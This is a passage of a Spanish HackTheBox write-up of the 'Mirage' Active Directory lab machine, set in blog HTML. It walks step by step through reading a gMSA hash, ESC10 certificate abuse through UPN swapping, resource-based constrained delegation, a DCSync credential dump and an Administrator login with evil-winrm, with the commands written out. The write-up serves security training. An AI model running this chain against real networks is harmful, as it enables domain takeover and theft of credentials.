+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ADUser</span> <span class="n">-Identity</span> <span class="n">javier</span><span class="p">.</span><span class="py">mmarshall</span> <span class="n">-Clear</span> <span class="n">logonHours</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="n">javier</span><span class="p">.</span><span class="py">mmarshall</span> <span class="n">-Properties</span> <span class="n">logonHours</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">logonHours</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_31" loading="lazy" src="/img/mirage/mirage_machine_31.png"></p>
+<p>Una vez hecho esto, comprobamos las credenciales con nxc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap mirage.htb -u javier.mmarshall -p <span class="s1">&#39;Password!&#39;</span> -k
+</span></span></code></pre></div><p><img alt="mirage_machine_32" loading="lazy" src="/img/mirage/mirage_machine_32.png"></p>
+<h1 id="as-javiermmarshall">As javier.mmarshall<a hidden class="anchor" aria-hidden="true" href="#as-javiermmarshall">#</a></h1>
+<h2 id="abusando-de-permisos-readgmsapassword---nxc">Abusando de permisos ReadGMSAPassword - Nxc<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-readgmsapassword---nxc">#</a></h2>
+<p>Ahora con el usuario javier.mmarshall bajo nuestro control podemos leer la contraseña GMSA del equipo sobre el cual tenemos los permisos <code>ReadGMSAPassword</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap mirage.htb -u javier.mmarshall -p <span class="s1">&#39;Password!&#39;</span> -k --gmsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Account: Mirage-Service$      NTLM: 305806d84f7c1be93a07aaf40f0c7866     PrincipalsAllowedToReadPassword: javier.mmarshall
+</span></span></code></pre></div><p><img alt="mirage_machine_33" loading="lazy" src="/img/mirage/mirage_machine_33.png"></p>
+<p>Comprobamos con nxc y vemos que nos autenticamos sin ningún problema.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap mirage.htb -u Mirage-Service$ -H <span class="s1">&#39;305806d84f7c1be93a07aaf40f0c7866&#39;</span> -k
+</span></span></code></pre></div><p><img alt="mirage_machine_34" loading="lazy" src="/img/mirage/mirage_machine_34.png"></p>
+<p>Sacamos el tgt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py mirage.htb/Mirage-Service$ -hashes aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.10.11.78
+</span></span></code></pre></div><p><img alt="mirage_machine_35" loading="lazy" src="/img/mirage/mirage_machine_35.png"></p>
+<h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<h2 id="abusando-de-esc2-y-esc3---certipy-failed">Abusando de ESC2 y ESC3 - Certipy (FAILED)<a hidden class="anchor" aria-hidden="true" href="#abusando-de-esc2-y-esc3---certipy-failed">#</a></h2>
+<p>Probando diferentes cosas, me pongo a buscar posibles configuraciones inseguras en AD CS con <code>certipy find</code>.</p>
+<p>En un principio pruebo el siguiente comando pero no me sacaba ninguna plantilla vulnerable, ya que a veces con el parámetro <code>-vulnerable</code>, certipy no es capaz de enumerar las plantillas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -k -dc-host DC01.mirage.htb -vulnerable -stdout
+</span></span></code></pre></div><p><img alt="mirage_machine_36" loading="lazy" src="/img/mirage/mirage_machine_36.png"></p>
+<p>Entonces, quitamos el parámetro <code>-vulnerable</code> y nos sale que se han detectado dos plantillas vulnerables <code>ESC2</code> y <code>ESC3</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -k -dc-host DC01.mirage.htb -stdout
+</span></span></code></pre></div><p><img alt="mirage_machine_37" loading="lazy" src="/img/mirage/mirage_machine_37.png"></p>
+<p><img alt="mirage_machine_38" loading="lazy" src="/img/mirage/mirage_machine_38.png"></p>
+<p>[ESC2: Any Purpose Certificate Template](certipy find -k -dc-host DC01.mirage.htb -stdout)</p>
+<p>Las explotaciones ESC2 incluyen dos componentes clave de los cuales fijarse para comprobar que la plantilla sea realmente vulnerable:</p>
+<ul>
+<li>Obtener un certificado para AnyPurpose: La primera plantilla contiene la flag &ldquo;AnyPurpose&rdquo; definida.</li>
+<li>Una plantilla que permita Enrollment Rights: Una segunda plantilla de certificados que permita a usuarios poco privilegiados como (Domain Users) permisos que permita el enrolamiento de agentes.</li>
+</ul>
+<blockquote>
+<p>Si miramos como identificar con certipy que la plantilla es vulnerable, nos tenemos que fijar en que la flag <code>AnyPurpose</code> sea igual a <code>True</code>.</p>
+</blockquote>
+<p>En nuestro caso, si nos fijamos vemos que tenemos la flag <code>AnyPurpose: False</code>. Y no tenemos ningún indicador de plantillas miss configuradas como: <code>[!] Vulnerabilities ESC2 : Template can be used for any purpose.</code> o <code>[!] Vulnerabilities ESC3 : Template has Certificate Request Agent EKU set.</code></p>
+<p>Si miramos que componentes necesitamos para la explotación de ESC3, vemos lo siguiente:</p>
+<ul>
+<li>Necesitamos una plantilla de certificados que permita el enrolamiento de agentes.
+Pero si miramos ambas plantillas vulnerables, vemos que ambas tienen el <code>Enrollment Agent: False</code>.</li>
+</ul>
+<p>Aun así he intentado a llevar a cabo la explotación de la vulnerabilidad ESC2 y ESC3 pero no ha sido posible. Con lo cual posiblemente estemos frente a un falso positivo que a veces ocurre con certipy.</p>
+<h2 id="esc10-weak-certificate-mapping-for-schannel-authentication">ESC10: Weak Certificate Mapping for Schannel Authentication<a hidden class="anchor" aria-hidden="true" href="#esc10-weak-certificate-mapping-for-schannel-authentication">#</a></h2>
+<p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication">ESC10: Weak Certificate Mapping for Schannel Authentication</a></p>
+<p>Primero leemos el upn del usuario victima (por si tenemos que restaurarlo luego):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy account -k -dc-host DC01.mirage.htb -user mark.bbond <span class="nb">read</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_39" loading="lazy" src="/img/mirage/mirage_machine_39.png"></p>
+<p>Despues actualizamos el upn del usuario victima al DC objetivo. (Necesitamos usas las credenciales de Mirage-Service para tener permisos para cambiar los atributos de mark.bbond)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/Mirage/CONTENT/Mirage-Service<span class="se">\$</span>.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">certipy account -k -dc-host DC01.mirage.htb -upn <span class="s1">&#39;DC01$@mirage.htb&#39;</span> -user mark.bbond update
+</span></span></code></pre></div><p><img alt="mirage_machine_40" loading="lazy" src="/img/mirage/mirage_machine_40.png"></p>
+<blockquote>
+<p>Si ya tenemos un TGT como el usuario mark.bbond, debemos renovarlo ya que no tendra el UPN correspondiente.</p>
+</blockquote>
+<p>Una vez con el upn del usuario victima como &ldquo;<a href="mailto:DC01@mirage.htb">DC01@mirage.htb</a>&rdquo;, exportamos a la variable <code>KRB5CCNAME</code> el archivo .ccache de mark.bbond.
+Una vez hecho esto, solicitamos un <code>certificado de autenticación del cliente</code> como el usuario &ldquo;mark.bbond&rdquo;. Que nos devolverá un certificado como <code>dc.pfx</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -k -dc-host DC01.mirage.htb -ca mirage-DC01-CA -template User
+</span></span></code></pre></div><p><img alt="mirage_machine_41" loading="lazy" src="/img/mirage/mirage_machine_41.png"></p>
+<p>Ahora, con el certificado revertimos el <code>upn</code> del usuario victima para que no haya conflictos a la hora de usar el certificado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy account -k -dc-host DC01.mirage.htb -upn <span class="s1">&#39;mark.bbond@mirage.htb&#39;</span> -user mark.bbond update
+</span></span></code></pre></div><p><img alt="mirage_machine_42" loading="lazy" src="/img/mirage/mirage_machine_42.png"></p>
+<p>Y finalmente probamos a autenticar-nos con la opción <code>auth</code> como el DC haciendo uso de LDAPS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx <span class="s1">&#39;dc01.pfx&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.78&#39;</span> -ldap-shell
+</span></span></code></pre></div><p><img alt="mirage_machine_43" loading="lazy" src="/img/mirage/mirage_machine_43.png"></p>
+<p>Ahora si miramos la lista de comandos que tenemos, veo que hay varias opciones para conseguir acceso total como administrador.</p>
+<p>Primero intento usar la opción dump para extraer usuarios, contraseñas LAPS etc. pero veo que no esta implementado:</p>
+<p><img alt="mirage_machine_44" loading="lazy" src="/img/mirage/mirage_machine_44.png"></p>
+<h2 id="otorgando-resource-based-constrained-delegation-a-mirage-service">Otorgando Resource-Based Constrained Delegation a Mirage-Service<a hidden class="anchor" aria-hidden="true" href="#otorgando-resource-based-constrained-delegation-a-mirage-service">#</a></h2>
+<p>Entonces pruebo a otorgar una delegación controlada bajo mi control en el DC. Para así impersonar al equipo <code>DC01</code>.</p>
+<p><img alt="mirage_machine_45" loading="lazy" src="/img/mirage/mirage_machine_45.png"></p>
+<p>Vulevo a renovar el TGT de Mirage-Service y con <code>getST.py</code> solicitamos un ticket cifs para el equipo <code>DC01</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getST.py -impersonate <span class="s1">&#39;DC01$&#39;</span> -spn <span class="s1">&#39;cifs/DC01.mirage.htb&#39;</span> -dc-ip 10.10.11.78 <span class="s1">&#39;mirage.htb/Mirage-Service$&#39;</span> -k -no-pass
+</span></span></code></pre></div><p><img alt="mirage_machine_46" loading="lazy" src="/img/mirage/mirage_machine_46.png"></p>
+<h2 id="dcsync-attack---secretdumpspy">DCSYNC Attack - Secretdumps.py<a hidden class="anchor" aria-hidden="true" href="#dcsync-attack---secretdumpspy">#</a></h2>
+<p>Ahora vamos a probar con <code>secretdumps.py</code> a realizar el ataque DSYNC Atack que nos permite extraer los hashes de todos los usuarios del dominio.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py -k -no-pass <span class="s1">&#39;mirage.htb/dc01$@dc01.mirage.htb&#39;</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_47" loading="lazy" src="/img/mirage/mirage_machine_47.png"></p>
+<p>Ahora que tenemos el hash de administrator, solicitamos un Ticket Garanting Ticket (TGT) y nos autenticamos con el a través de evil-winrm para obtener acceso como <code>Domain Admin</code>.</p>
+<p>​</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py mirage.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.10.11.78
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/Mirage/CONTENT/Administrator.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">evil-winrm -i DC01.mirage.htb -r mirage.htb
+</span></span></code></pre></div><p><img alt="mirage_machine_48" loading="lazy" src="/img/mirage/mirage_machine_48.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/hard/">Hard</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/nfs/">NFS</a></li>
+      <li><a href="https://borhuub.github.io/tags/dns-update/">DNS-Update</a></li>
+      <li><a href="https://borhuub.github.io/tags/kerberoasting/">Kerberoasting</a></li>
+      <li><a href="https://borhuub.github.io/tags/winpeas/">WinPEAS</a></li>
+      <li><a href="https://borhuub.github.io/tags/forcechangepassword/">ForceChangePassword</a></li>
+      <li><a href="https://borhuub.github.io/tags/accountdisable/">AccountDisable</a></li>
+      <li><a href="https://borhuub.github.io/tags/logonhours/">LogonHours</a></li>
+      <li><a href="https://borhuub.github.io/tags/readgmsapassword/">ReadGMSAPassword</a></li>
+      <li><a href="https://borhuub.github.io/tags/esc10/">ESC10</a></li>
+      <li><a href="https://borhuub.github.io/tags/rbcd/">RBCD</a></li>
+      <li><a href="https://borhuub.github.io/tags/dcsync-attack/">DCSync-Attack</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/linkvortex/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Linkvortex</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/nanocorp/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Nanocorp</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
